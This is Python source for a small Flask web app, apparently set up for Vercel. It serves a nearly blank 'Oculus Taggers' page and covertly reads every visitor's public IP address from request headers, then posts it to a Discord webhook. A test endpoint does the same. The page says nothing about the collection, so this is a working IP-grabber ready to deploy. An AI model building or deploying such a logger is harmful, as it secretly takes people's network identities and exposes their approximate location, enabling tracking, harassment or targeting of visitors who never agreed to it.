import os
import json
import urllib.request
from flask import Flask, request

app = Flask(__name__)

# Discord webhook stored in Vercel Environment Variables
WEBHOOK_URL = os.environ.get("ATTESTATION_WEBHOOK_URL")


def get_visitor_ip():
    # Vercel forwards the visitor's public IP in this header
    forwarded_for = request.headers.get("X-Forwarded-For")

    if forwarded_for:
        return forwarded_for.split(",")[0].strip()

    # Fallback
    return request.headers.get("X-Real-IP") or request.remote_addr or "Unknown"


def send_webhook(ip):
    if not WEBHOOK_URL:
        print("ERROR: ATTESTATION_WEBHOOK_URL is not set")
        return False

    payload = {
        "username": "Tyrone",
        "embeds": [
            {
                "title": "Tyrone",
                "description": "Tyrone.",
                "fields": [
                    {
                        "name": "🌐 IP Address",
                        "value": f"`{ip}`",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Tyrone"
                }
            }
        ]
    }

    data = json.dumps(payload).encode("utf-8")

    req = urllib.request.Request(
        WEBHOOK_URL,
        data=data,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "OculusTaggers/1.0"
        },
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            print("Discord response:", response.status)
            return 200 <= response.status < 300

    except Exception as error:
        print("Discord webhook error:", str(error))
        return False


@app.route("/")
def home():
    ip = get_visitor_ip()

    send_webhook(ip)

    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Oculus Taggers</title>
    </head>
    <body>
        <h1>Oculus Taggers</h1>
        <p>bird.</p>
    </body>
    </html>
    """


@app.route("/api/test")
def test():
    ip = get_visitor_ip()

    success = send_webhook(ip)

    return {
        "ok": success,
        "ip": ip,
        "message": "Webhook sent" if success else "Webhook failed"
    }
